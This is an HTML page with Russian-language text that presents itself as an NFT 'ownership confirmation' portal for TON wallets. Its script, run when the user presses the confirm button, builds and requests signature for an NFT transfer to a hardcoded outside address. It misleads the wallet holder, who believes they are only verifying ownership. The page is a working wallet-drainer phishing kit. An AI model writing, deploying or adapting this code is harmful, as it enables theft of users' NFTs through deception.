<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Transfer Portal</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.6); border: 1px solid #333; }
        #ton-connect-button { display: flex; justify-content: center; margin: 20px 0; }
        .nft-info { margin-bottom: 20px; padding: 15px; background: #2d2d2d; border-radius: 12px; min-height: 100px; }
        .nft-image { width: 100%; border-radius: 10px; margin-bottom: 10px; display: none; }
        .nft-name { font-weight: bold; font-size: 1.2em; margin-bottom: 5px; }
        button.action-btn { width: 100%; padding: 14px; background: #0088cc; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; display: none; font-size: 16px; transition: 0.3s; }
        button.action-btn:hover { background: #00aaff; }
    </style>
</head>
<body>

<div class="card">
    <h2>Подтверждение владения</h2>
    
    <div class="nft-info" id="info">
        <img id="nftPreview" class="nft-image" src="" alt="NFT Preview">
        <div id="nftTitle" class="nft-name">Загрузка данных...</div>
        <div id="nftIdDisplay" style="color: #888; font-size: 0.9em;">Ожидание адреса...</div>
    </div>

    <div id="ton-connect-button"></div>

    <button id="transferBtn" class="action-btn" onclick="sendTransaction()">Подтвердить передачу</button>
</div>

<script>
    // 1. Инициализация TON Connect
    const tonConnectUI = new TONConnectUI.TonConnectUI({
        manifestUrl: 'https://your-domain.com/tonconnect-manifest.json', 
        buttonRootId: 'ton-connect-button'
    });

    const urlParams = new URLSearchParams(window.location.search);
    const nftAddress = urlParams.get('address'); // Пример: ?address=EQD...
    const nftId = urlParams.get('id') || "NFT";

    // 2. Функция получения данных об NFT (через публичное API)
    async function fetchNFTData() {
        if (!nftAddress) {
            document.getElementById('nftTitle').innerText = "Адрес NFT не указан";
            document.getElementById('nftIdDisplay').innerText = "Добавьте ?address= в URL";
            return;
        }

        try {
            // Используем бесплатное API TonAPI для получения метаданных
            const response = await fetch(`https://tonapi.io/v2/nfts/${nftAddress}`);
            const data = await response.json();

            if (data.metadata) {
                document.getElementById('nftTitle').innerText = data.metadata.name || "Без названия";
                document.getElementById('nftIdDisplay').innerText = "ID: " + (data.index || nftId);
                
                if (data.metadata.image) {
                    const img = document.getElementById('nftPreview');
                    img.src = data.metadata.image;
                    img.style.display = 'block';
                }
            }
        } catch (e) {
            console.error("Ошибка при загрузке данных NFT:", e);
            document.getElementById('nftTitle').innerText = "NFT найден";
            document.getElementById('nftIdDisplay').innerText = nftAddress.slice(0,6) + "..." + nftAddress.slice(-6);
        }
    }

    fetchNFTData();

    // 3. Логика появления кнопки
    tonConnectUI.onStatusChange(wallet => {
        const btn = document.getElementById('transferBtn');
        btn.style.display = (wallet && nftAddress) ? 'block' : 'none';
    });

    // 4. Функция отправки транзакции
    async function sendTransaction() {
        if (!tonConnectUI.account) return alert("Подключите кошелек!");

        const tonWeb = new TonWeb();
        const Cell = TonWeb.boc.Cell;
        
        try {
            const payload = new Cell();
            payload.bits.writeUint(0x5fcc3d14, 32); 
            payload.bits.writeUint(0, 64);          
            payload.bits.writeAddress(new TonWeb.utils.Address("UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k")); 
            payload.bits.writeAddress(new TonWeb.utils.Address(tonConnectUI.account.address)); 
            payload.bits.writeBit(false);           
            payload.bits.writeCoins(TonWeb.utils.toNano('0.02')); 
            payload.bits.writeBit(false);           

            const payloadBoc = TonWeb.utils.bytesToBase64(await payload.toBoc());

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: nftAddress,
                    amount: "50000000", 
                    payload: payloadBoc
                }]
            };

            await tonConnectUI.sendTransaction(transaction);
            alert("Транзакция отправлена!");
        } catch (e) {
            console.error(e);
            alert("Ошибка при отправке");
        }
    }
</script>

</body>
</html>
